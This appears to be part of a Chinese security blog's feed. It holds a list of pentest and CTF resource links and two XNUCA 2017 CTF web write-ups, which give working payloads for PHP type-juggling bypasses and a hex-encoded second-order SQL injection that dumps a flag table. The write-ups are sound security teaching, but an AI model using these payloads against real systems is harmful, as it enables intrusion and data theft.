<li><a href="http://docs.ioin.in/writeup/blog.heysec.org/_archives_577/index.html" target="_blank" rel="external">端口渗透总结</a></li>
<li><a href="https://mp.weixin.qq.com/s?__biz=MzI5MDQ2NjExOQ==&amp;mid=2247484812&amp;idx=1&amp;sn=7d894b50b3947142fbfa3a4016f748d5&amp;chksm=ec1e35a4db69bcb2acfe7ecb3b0cd1d366c54bfa1feaafc62c4290b3fd2eddab9aa95a98f041#rd" target="_blank" rel="external">端口扫描那些事</a></li>
<li><a href="http://blog.neargle.com/SecNewsBak/drops/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7%E2%80%94%E2%80%94%E9%80%9A%E8%BF%87cmd%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6%E7%9A%84N%E7%A7%8D%E6%96%B9%E6%B3%95.html" target="_blank" rel="external">渗透技巧——通过cmd上传文件的N种方法 </a></li>
<li><a href="http://www.freebuf.com/articles/web/142659.html" target="_blank" rel="external">域渗透TIPS：获取LAPS管理员密码 </a></li>
<li><a href="http://blog.neargle.com/SecNewsBak/drops/%E5%9F%9F%E6%B8%97%E9%80%8F%E2%80%94%E2%80%94Security%20Support%20Provider.html" target="_blank" rel="external">域渗透——Security Support Provider</a></li>
<li><a href="http://docs.ioin.in/writeup/www.91ri.org/_14390_html/index.html" target="_blank" rel="external">内网渗透随想</a></li>
<li><a href="http://bobao.360.cn/learning/detail/3266.html" target="_blank" rel="external">域渗透之流量劫持</a></li>
<li><a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E5%BF%AB%E6%8D%B7%E6%96%B9%E5%BC%8F%E6%96%87%E4%BB%B6%E7%9A%84%E5%8F%82%E6%95%B0%E9%9A%90%E8%97%8F%E6%8A%80%E5%B7%A7/" target="_blank" rel="external">渗透技巧——快捷方式文件的参数隐藏技巧</a></li>
<li><a href="https://bbs.ichunqiu.com/thread-25119-1-1.html?from=sec" target="_blank" rel="external">后门整理</a></li>
<li><a href="https://www.secpulse.com/archives/59674.html" target="_blank" rel="external">Linux后门整理合集（脉搏推荐）</a></li>
</ul>
<h2 id="运维"><a href="#运维" class="headerlink" title="运维"></a>运维</h2><ul>
<li><a href="https://xianzhi.aliyun.com/forum/read/1655.html" target="_blank" rel="external">黑客入侵应急分析手工排查</a></li>
<li><a href="http://www.mottoin.com/92742.html" target="_blank" rel="external">企业常见服务漏洞检测&amp;修复整理</a></li>
<li><a href="https://mp.weixin.qq.com/s/0nxiZw1NUoQTjxcd3zl6Zg" target="_blank" rel="external">Linux基线加固</a></li>
</ul>
<h1 id="CTF"><a href="#CTF" class="headerlink" title="CTF"></a>CTF</h1><h2 id="技巧总结"><a href="#技巧总结" class="headerlink" title="技巧总结"></a>技巧总结</h2><ul>
<li><a href="https://ctf-wiki.github.io/ctf-wiki/#/introduction" target="_blank" rel="external">ctf-wiki</a></li>
<li><a href="https://www.hackfun.org/CTF/coding-and-encryption-of-those-brain-holes-in-CTF.html" target="_blank" rel="external">CTF中那些脑洞大开的编码和加密</a></li>
<li><a href="http://thief.one/2017/06/13/1/" target="_blank" rel="external">CTF加密与解密 </a></li>
<li><a href="https://www.hackfun.org/CTF/summary-of-image-hiding-files-in-CTF.html" target="_blank" rel="external">CTF中图片隐藏文件分离方法总结</a></li>
<li><a href="http://www.freebuf.com/articles/database/137129.html" target="_blank" rel="external">Md5扩展攻击的原理和应用</a></li>
<li><a href="http://bobao.360.cn/ctf/detail/203.html" target="_blank" rel="external">CTF比赛中关于zip的总结</a></li>
<li><a href="http://weibo.com/ttarticle/p/show?id=2309403980950244591011" target="_blank" rel="external">十五个Web狗的CTF出题套路</a></li>
<li><a href="https://827977014.docs.qq.com/Bt2v7IZWnYo?type=1&amp;_wv=1&amp;_bid=2517" target="_blank" rel="external">CTF备忘录</a></li>
<li><a href="http://rcoil.me/2017/06/CTF%E7%BA%BF%E4%B8%8B%E8%B5%9B%E6%80%BB%E7%BB%93/" target="_blank" rel="external">rcoil:CTF线下攻防赛总结</a></li>
</ul>
<h1 id="杂"><a href="#杂" class="headerlink" title="杂"></a>杂</h1><ul>
<li><a href="http://syean.cn/2017/08/15/%E8%B0%88%E8%B0%88HTML5%E6%9C%AC%E5%9C%B0%E5%AD%98%E5%82%A8%E2%80%94%E2%80%94WebStorage/" target="_blank" rel="external">谈谈HTML5本地存储——WebStorage</a></li>
<li><a href="https://segmentfault.com/p/1210000010668099/read" target="_blank" rel="external">Linux下容易被忽视的那些命令用法</a></li>
<li><a href="http://www.mottoin.com/94895.html" target="_blank" rel="external">各种脚本语言不同版本一句话开启 HTTP 服务器的总结</a></li>
<li><a href="http://bobao.360.cn/learning/detail/3757.html" target="_blank" rel="external">WebAssembly入门：将字节码带入Web世界</a></li>
<li><a href="https://www.leavesongs.com/PENETRATION/phpwind-hash-length-extension-attack.html" target="_blank" rel="external">phpwind 利用哈希长度扩展攻击进行getshell</a></li>
<li><a href="http://www.freebuf.com/articles/web/69264.html" target="_blank" rel="external">深入理解hash长度扩展攻击（sha1为例） </a></li>
<li><a href="http://bobao.360.cn/learning/detail/3909.html" target="_blank" rel="external">Joomla 框架的程序执行流程及目录结构分析</a></li>
<li><a href="http://bobao.360.cn/learning/detail/4268.html" target="_blank" rel="external">如何通过恶意插件在Atom中植入后门</a></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Web-Security-Learning 学习资料&lt;br&gt;8月21日更新：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;整合前端安全模块&lt;/li&gt;
&lt;li&gt;新收录文章：&lt;ul&gt;
&lt;li&gt;前端安全；&lt;a href=&quot;http://paper.seebug.org/130/?from=timeline&amp;amp;isappinstalled=0&quot;&gt;当代 Web 的 JSON 劫持技巧&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;提权： &lt;a href=&quot;https://mp.weixin.qq.com/s/ERXOLhWo0-lJbMV143I8hA&quot;&gt;Windows提权系列中篇&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;杂：&lt;a href=&quot;http://bobao.360.cn/learning/detail/4268.html&quot;&gt;如何通过恶意插件在Atom中植入后门&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>XNUCA 2017-Web专题赛前指导-php是最好的语言-writeup</title>
    <link href="http://yoursite.com/2017/08/18/XNUCA-2017-Web%E4%B8%93%E9%A2%98%E8%B5%9B%E5%89%8D%E6%8C%87%E5%AF%BC-php%E6%98%AF%E6%9C%80%E5%A5%BD%E7%9A%84%E8%AF%AD%E8%A8%80-writeup/"/>
    <id>http://yoursite.com/2017/08/18/XNUCA-2017-Web专题赛前指导-php是最好的语言-writeup/</id>
    <published>2017-08-18T09:45:39.000Z</published>
    <updated>2017-08-18T11:41:14.546Z</updated>
    
    <content type="html"><![CDATA[<p>php弱类型比较<br>strcmp、eregi<br><a id="more"></a></p>
<h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://218.76.35.75:20114/</div></pre></td></tr></table></figure>
<h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h1><p>源代码如下:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">show_source(<span class="keyword">__FILE__</span>);</div><div class="line">$v1=<span class="number">0</span>;$v2=<span class="number">0</span>;$v3=<span class="number">0</span>;</div><div class="line">$a=(<span class="keyword">array</span>)json_decode(@$_GET[<span class="string">'foo'</span>]);</div><div class="line"><span class="keyword">if</span>(is_array($a))&#123;</div><div class="line">   is_numeric(@$a[<span class="string">"bar1"</span>])?<span class="keyword">die</span>(<span class="string">"nope"</span>):<span class="keyword">NULL</span>;</div><div class="line">   <span class="keyword">if</span>(@$a[<span class="string">"bar1"</span>])&#123;</div><div class="line">	   ($a[<span class="string">"bar1"</span>]&gt;<span class="number">2016</span>)?$v1=<span class="number">1</span>:<span class="keyword">NULL</span>;</div><div class="line">   &#125;</div><div class="line">   <span class="keyword">if</span>(is_array(@$a[<span class="string">"bar2"</span>]))&#123;</div><div class="line">	   <span class="keyword">if</span>(count($a[<span class="string">"bar2"</span>])!==<span class="number">5</span> <span class="keyword">OR</span> !is_array($a[<span class="string">"bar2"</span>][<span class="number">0</span>])) <span class="keyword">die</span>(<span class="string">"nope"</span>);</div><div class="line">	   $pos = array_search(<span class="string">"nudt"</span>, $a[<span class="string">"a2"</span>]);</div><div class="line">	   $pos===<span class="keyword">false</span>?<span class="keyword">die</span>(<span class="string">"nope"</span>):<span class="keyword">NULL</span>;</div><div class="line">	   <span class="keyword">foreach</span>($a[<span class="string">"bar2"</span>] <span class="keyword">as</span> $key=&gt;$val)&#123;</div><div class="line">		   $val===<span class="string">"nudt"</span>?<span class="keyword">die</span>(<span class="string">"nope"</span>):<span class="keyword">NULL</span>;</div><div class="line">	   &#125;</div><div class="line">	   $v2=<span class="number">1</span>;</div><div class="line">   &#125;</div><div class="line">&#125;</div><div class="line">$c=@$_GET[<span class="string">'cat'</span>];</div><div class="line">$d=@$_GET[<span class="string">'dog'</span>];</div><div class="line"><span class="keyword">if</span>(@$c[<span class="number">1</span>])&#123;</div><div class="line">   <span class="keyword">if</span>(!strcmp($c[<span class="number">1</span>],$d) &amp;&amp; $c[<span class="number">1</span>]!==$d)&#123;</div><div class="line">	   eregi(<span class="string">"3|1|c"</span>,$d.$c[<span class="number">0</span>])?<span class="keyword">die</span>(<span class="string">"nope"</span>):<span class="keyword">NULL</span>;</div><div class="line">	   strpos(($c[<span class="number">0</span>].$d), <span class="string">"htctf2016"</span>)?$v3=<span class="number">1</span>:<span class="keyword">NULL</span>;</div><div class="line">   &#125;</div><div class="line">&#125;</div><div class="line"><span class="keyword">if</span>($v1 &amp;&amp; $v2 &amp;&amp; $v3)&#123;</div><div class="line">   <span class="keyword">include</span> <span class="string">"flag.php"</span>;</div><div class="line">   <span class="keyword">echo</span> $flag;</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<p>接下来逐步分析。目标是让v1，v2，v3都为 1，这样才能得到flag。</p>
<h2 id="v1"><a href="#v1" class="headerlink" title="v1"></a>v1</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">$a=(<span class="keyword">array</span>)json_decode(@$_GET[<span class="string">'foo'</span>]);</div><div class="line"><span class="keyword">if</span>(is_array($a))&#123;</div><div class="line">    is_numeric(@$a[<span class="string">"bar1"</span>])?<span class="keyword">die</span>(<span class="string">"nope"</span>):<span class="keyword">NULL</span>;</div><div class="line">    <span class="keyword">if</span>(@$a[<span class="string">"bar1"</span>])&#123;</div><div class="line">        ($a[<span class="string">"bar1"</span>]&gt;<span class="number">2016</span>)?$v1=<span class="number">1</span>:<span class="keyword">NULL</span>;</div><div class="line">    &#125;</div><div class="line">    ....</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>传入的foo，经过一次json_decode，然后转换成array。然后判断 <code>$a[&quot;bar1&quot;]</code> 是否满足 is_numeric，若满足则die掉。接下来又判断 <code>$a[&quot;bar1&quot;]</code> 是否大于 2016 。</p>
<p>利用php弱类型特性，可以设置<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$a[&quot;bar1&quot;] = 2017a</div></pre></td></tr></table></figure></p>
<p>这样is_numeric时会判断其为字符串而不是数字，而在与2016的比较中，会直接转换成2017，满足大于2016。这样 v1 就被设置为 1 了。</p>
<h2 id="v2"><a href="#v2" class="headerlink" title="v2"></a>v2</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span>(is_array(@$a[<span class="string">"bar2"</span>]))&#123;</div><div class="line">	<span class="keyword">if</span>(count($a[<span class="string">"bar2"</span>])!==<span class="number">5</span> <span class="keyword">OR</span> !is_array($a[<span class="string">"bar2"</span>][<span class="number">0</span>])) <span class="keyword">die</span>(<span class="string">"nope"</span>);</div><div class="line">	$pos = array_search(<span class="string">"nudt"</span>, $a[<span class="string">"a2"</span>]);</div><div class="line">	$pos===<span class="keyword">false</span>?<span class="keyword">die</span>(<span class="string">"nope"</span>):<span class="keyword">NULL</span>;</div><div class="line">	<span class="keyword">foreach</span>($a[<span class="string">"bar2"</span>] <span class="keyword">as</span> $key=&gt;$val)&#123;</div><div class="line">		$val===<span class="string">"nudt"</span>?<span class="keyword">die</span>(<span class="string">"nope"</span>):<span class="keyword">NULL</span>;</div><div class="line">	&#125;</div><div class="line">	$v2=<span class="number">1</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>接下来，要求<code>$a[&quot;bar2&quot;]</code>是个数组，其中元素的个数为5个（count($a[“bar2”])!==5），同时要求<code>$a[&quot;bar2&quot;][0]</code>是数组。所以我们设置:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$a[&quot;bar2&quot;] = [[],2,3,4,5]</div></pre></td></tr></table></figure></p>
<p>对于 <code>$pos = array_search(&quot;nudt&quot;, $a[&quot;a2&quot;]);</code>，它搜索字符串“nudt”在$a[“a2”]中的位置。若没有找到，array_search返回false，会通过严格比较导致die掉。所以这里要设置：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$a[&quot;a2&quot;] = “nudt”</div></pre></td></tr></table></figure></p>
<p>注意这里因为用了<code>$pos===false?</code>的严格比较，所以0不<code>===</code>false。</p>
<p>之后就能设置 v2 = 1</p>
<p>结合$a是由json_decode得来，所以第一个payload为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">foo=&#123;&quot;bar1&quot;:&quot;2017a&quot;,&quot;bar2&quot;:[[],2,3,4,5],&quot;a2&quot;:[&quot;nudt&quot;]&#125;</div></pre></td></tr></table></figure></p>
<h2 id="v3"><a href="#v3" class="headerlink" title="v3"></a>v3</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">$c=@$_GET[<span class="string">'cat'</span>];</div><div class="line">$d=@$_GET[<span class="string">'dog'</span>];</div><div class="line"><span class="keyword">if</span>(@$c[<span class="number">1</span>])&#123;</div><div class="line">   <span class="keyword">if</span>(!strcmp($c[<span class="number">1</span>],$d) &amp;&amp; $c[<span class="number">1</span>]!==$d)&#123;</div><div class="line">	   eregi(<span class="string">"3|1|c"</span>,$d.$c[<span class="number">0</span>])?<span class="keyword">die</span>(<span class="string">"nope"</span>):<span class="keyword">NULL</span>;</div><div class="line">	   strpos(($c[<span class="number">0</span>].$d), <span class="string">"htctf2016"</span>)?$v3=<span class="number">1</span>:<span class="keyword">NULL</span>;</div><div class="line">   &#125;</div><div class="line">&#125;</div><div class="line"><span class="keyword">if</span>($v1 &amp;&amp; $v2 &amp;&amp; $v3)&#123;</div><div class="line">   <span class="keyword">include</span> <span class="string">"flag.php"</span>;</div><div class="line">   <span class="keyword">echo</span> $flag;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>先会用strcmp进行比较，利用数组array和字符串进行strcmp比较会返回null，而且数组array也不会等于字符串，我们可以设置cat[1]为一个数组。</p>
<p>接下来用eregi对拼接后的字符串<code>$d.$c[0]</code>进行正则匹配，若匹配到则die掉。而下一步又要求拼接字符串<code>$c[0].$d</code>中要有字符串“htctf2016”。这里利用%00对eregi的截断功能，则在正则匹配eregi时在开头时就匹配结束掉。</p>
<p><code>strpos(($c[0].$d), &quot;htctf2016&quot;)</code>中，还要求“htctf2016”不能出现在开头。</p>
<p>所以设置：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$d = %00 即 dog=%00</div><div class="line"></div><div class="line">$c[0]  = &quot;ahtctf2016&quot;</div></pre></td></tr></table></figure></p>
<p>所以综上所述，构造总的payload如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://218.76.35.75:20114/?foo=&#123;&quot;bar1&quot;:&quot;2017e&quot;,&quot;bar2&quot;:[[],2,3,4,5],&quot;a2&quot;:[&quot;nudt&quot;]&#125;&amp;cat[0]=ahtctf2016&amp;cat[1][]=&amp;dog=%00</div></pre></td></tr></table></figure></p>
<p>得到flag:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">php_i5_n0t_b4d</div></pre></td></tr></table></figure></p>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>题目已收录进：<a href="https://github.com/CHYbeta/CTF-Web-Challenge/blob/master/php/challenge-2.md" target="_blank" rel="external">CTF-Web-Challenge-php：challenge-2</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;php弱类型比较&lt;br&gt;strcmp、eregi&lt;br&gt;
    
    </summary>
    
      <category term="writeup:Web" scheme="http://yoursite.com/categories/writeup-Web/"/>
    
    
      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
    
      <category term="writeup" scheme="http://yoursite.com/tags/writeup/"/>
    
      <category term="web" scheme="http://yoursite.com/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>XNUCA 2017-Web专题赛前指导-vote-writeup</title>
    <link href="http://yoursite.com/2017/08/18/XNUCA-2017-Web%E4%B8%93%E9%A2%98%E8%B5%9B%E5%89%8D%E6%8C%87%E5%AF%BC-vote-writeup/"/>
    <id>http://yoursite.com/2017/08/18/XNUCA-2017-Web专题赛前指导-vote-writeup/</id>
    <published>2017-08-18T08:44:33.000Z</published>
    <updated>2017-08-18T11:40:14.474Z</updated>
    
    <content type="html"><![CDATA[<p>源码泄露、二次注入<br><a id="more"></a></p>
<h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">描述：据说可以注入，然而……</div><div class="line"></div><div class="line">http://218.76.35.75:65080/</div></pre></td></tr></table></figure>
<h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h1><p>一个简单的投票功能。初步测试后没有回显，没有报错。在CTF中，越是简单越是没有提示的，往往都有源码泄露之类的。</p>
<h2 id="源码泄露-恢复"><a href="#源码泄露-恢复" class="headerlink" title="源码泄露/恢复"></a>源码泄露/恢复</h2><p>访问：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://218.76.35.75:65080/.index.php.swp</div></pre></td></tr></table></figure></p>
<p>下载下来，win下下下来后文件名变成了index.php.swp。用vim恢复文件。命令如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">vim -r index.php</div></pre></td></tr></table></figure></p>
<p>直接在vim中看可能不太方便，可以用下面的命令将其另存为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">w filename</div></pre></td></tr></table></figure></p>
<p>得到恢复后的源码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="keyword">include</span> <span class="string">'db.php'</span>;</div><div class="line">session_start();</div><div class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_SESSION[<span class="string">'login'</span>])) &#123;</div><div class="line">	$_SESSION[<span class="string">'login'</span>] = <span class="string">'guest'</span>.mt_rand(<span class="number">1e5</span>, <span class="number">1e6</span>);</div><div class="line">&#125;</div><div class="line">$login = $_SESSION[<span class="string">'login'</span>];</div><div class="line"></div><div class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</div><div class="line">	<span class="keyword">if</span> (!<span class="keyword">isset</span>($_POST[<span class="string">'id'</span>], $_POST[<span class="string">'vote'</span>]) || !is_numeric($_POST[<span class="string">'id'</span>]))</div><div class="line">		<span class="keyword">die</span>(<span class="string">'please select ...'</span>);</div><div class="line">	$id = $_POST[<span class="string">'id'</span>];</div><div class="line">	$vote = (int)$_POST[<span class="string">'vote'</span>];</div><div class="line">	<span class="keyword">if</span> ($vote &gt; <span class="number">5</span> || $vote &lt; <span class="number">1</span>)</div><div class="line">		$vote = <span class="number">1</span>;</div><div class="line">	$q = mysql_query(<span class="string">"INSERT INTO t_vote VALUES (&#123;$id&#125;, &#123;$vote&#125;, '&#123;$login&#125;')"</span>);</div><div class="line">	$q = mysql_query(<span class="string">"SELECT id FROM t_vote WHERE user = '&#123;$login&#125;' GROUP BY id"</span>);</div><div class="line">	<span class="keyword">echo</span> <span class="string">'&lt;p&gt;&lt;b&gt;Thank you!&lt;/b&gt; Results:&lt;/p&gt;'</span>;</div><div class="line">	<span class="keyword">echo</span> <span class="string">'&lt;table border="1"&gt;'</span>;</div><div class="line">	<span class="keyword">echo</span> <span class="string">'&lt;tr&gt;&lt;th&gt;Logo&lt;/th&gt;&lt;th&gt;Total votes&lt;/th&gt;&lt;th&gt;Average&lt;/th&gt;&lt;/tr&gt;'</span>;</div><div class="line">	<span class="keyword">while</span> ($r = mysql_fetch_array($q)) &#123;</div><div class="line">		$arr = mysql_fetch_array(mysql_query(<span class="string">"SELECT title FROM t_picture WHERE id = "</span>.$r[<span class="string">'id'</span>]));</div><div class="line">		<span class="keyword">echo</span> <span class="string">'&lt;tr&gt;&lt;td&gt;'</span>.$arr[<span class="number">0</span>].<span class="string">'&lt;/td&gt;'</span>;</div><div class="line">		$arr = mysql_fetch_array(mysql_query(<span class="string">"SELECT COUNT(value), AVG(value) FROM t_vote WHERE id = "</span>.$r[<span class="string">'id'</span>]));</div><div class="line">		<span class="keyword">echo</span> <span class="string">'&lt;td&gt;'</span>.$arr[<span class="number">0</span>].<span class="string">'&lt;/td&gt;&lt;td&gt;'</span>.round($arr[<span class="number">1</span>],<span class="number">2</span>).<span class="string">'&lt;/td&gt;&lt;/tr&gt;'</span>;</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">echo</span> <span class="string">'&lt;/table&gt;'</span>;</div><div class="line">	<span class="keyword">echo</span> <span class="string">'&lt;br&gt;&lt;a href="index.php"&gt;goBack&lt;/a&gt;&lt;br&gt;'</span>;</div><div class="line">	<span class="keyword">exit</span>;</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div><div class="line">&lt;html&gt;</div><div class="line">&lt;head&gt;</div><div class="line">	&lt;title&gt;Movie vote&lt;/title&gt;</div><div class="line">&lt;/head&gt;</div><div class="line">&lt;body&gt;</div><div class="line">&lt;p&gt;Welcome, Movie vote&lt;/p&gt;</div><div class="line">&lt;form action=<span class="string">"index.php"</span> method=<span class="string">"POST"</span>&gt;</div><div class="line">&lt;table border=<span class="string">"1"</span> cellspacing=<span class="string">"5"</span>&gt;</div><div class="line">&lt;tr&gt;</div><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$q = mysql_query(<span class="string">'SELECT * FROM t_picture'</span>);</div><div class="line"><span class="keyword">while</span> ($r = mysql_fetch_array($q)) &#123;</div><div class="line">	<span class="keyword">echo</span> <span class="string">'&lt;td&gt;&lt;img src="./images/'</span>.$r[<span class="string">'image'</span>].<span class="string">'"&gt;&lt;div align="center"&gt;'</span>.$r[<span class="string">'title'</span>].<span class="string">'&lt;br&gt;&lt;input type="radio" name="id" value="'</span>.$r[<span class="string">'id'</span>].<span class="string">'"&gt;&lt;/div&gt;&lt;/td&gt;'</span>;</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div><div class="line">&lt;/tr&gt;</div><div class="line">&lt;/table&gt;</div><div class="line">&lt;p&gt;Your vote:</div><div class="line">&lt;select name=<span class="string">"vote"</span>&gt;</div><div class="line">&lt;option value=<span class="string">"1"</span>&gt;<span class="number">1</span>&lt;/option&gt;</div><div class="line">&lt;option value=<span class="string">"2"</span>&gt;<span class="number">2</span>&lt;/option&gt;</div><div class="line">&lt;option value=<span class="string">"3"</span>&gt;<span class="number">3</span>&lt;/option&gt;</div><div class="line">&lt;option value=<span class="string">"4"</span>&gt;<span class="number">4</span>&lt;/option&gt;</div><div class="line">&lt;option value=<span class="string">"5"</span>&gt;<span class="number">5</span>&lt;/option&gt;</div><div class="line">&lt;/select&gt;&lt;/p&gt;</div><div class="line">&lt;input type=<span class="string">"submit"</span> name=<span class="string">"submit"</span> value=<span class="string">"Submit"</span>&gt;</div><div class="line">&lt;/form&gt;</div><div class="line">&lt;/body&gt;</div><div class="line">&lt;/html&gt;</div></pre></td></tr></table></figure></p>
<h2 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h2><p>注入点在这里：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">if (!isset($_POST[&apos;id&apos;], $_POST[&apos;vote&apos;]) || !is_numeric($_POST[&apos;id&apos;]))</div></pre></td></tr></table></figure></p>
<p>post进的参数id，经过php的函数is_numeric()检测后，insert到数据库中；<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$q = mysql_query(&quot;INSERT INTO t_vote VALUES (&#123;$id&#125;, &#123;$vote&#125;, &apos;&#123;$login&#125;&apos;)&quot;);</div></pre></td></tr></table></figure></p>
<p>在完成投票后，根据id值将title取出来：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">$q = mysql_query(&quot;SELECT id FROM t_vote WHERE user = &apos;&#123;$login&#125;&apos; GROUP BY id&quot;);</div><div class="line">。。。</div><div class="line">$r = mysql_fetch_array($q)</div><div class="line">。。。</div><div class="line">$arr = mysql_fetch_array(mysql_query(&quot;SELECT title FROM t_picture WHERE id = &quot;.$r[&apos;id&apos;]));</div><div class="line">echo &apos;&lt;tr&gt;&lt;td&gt;&apos;.$arr[0].&apos;&lt;/td&gt;&apos;;</div></pre></td></tr></table></figure></p>
<p>当我们传入经过十六进制转换的payload后，通过is_numeric()的检查，然后被插入到数据库中。而mysql将数据取出来时候会自动unhex一下，从而造成sql注入。</p>
<p>根据泄露出来的源码，我们推测表为 t_flag，字段为flag。我们要注入后的语句为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">SELECT title FROM t_picture WHERE id = -2  UNION SELECT GROUP_CONCAT(flag) FROM t_flag</div></pre></td></tr></table></figure></p>
<p>这样因为不存在id为-2，从而能显示出flag。即payload为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">hex(-2  UNION SELECT GROUP_CONCAT(flag) FROM t_flag)</div><div class="line"></div><div class="line">	=&gt;</div><div class="line"></div><div class="line">0x2d322020554e494f4e2053454c4543542047524f55505f434f4e43415428666c6167292046524f4d20745f666c6167</div></pre></td></tr></table></figure></p>
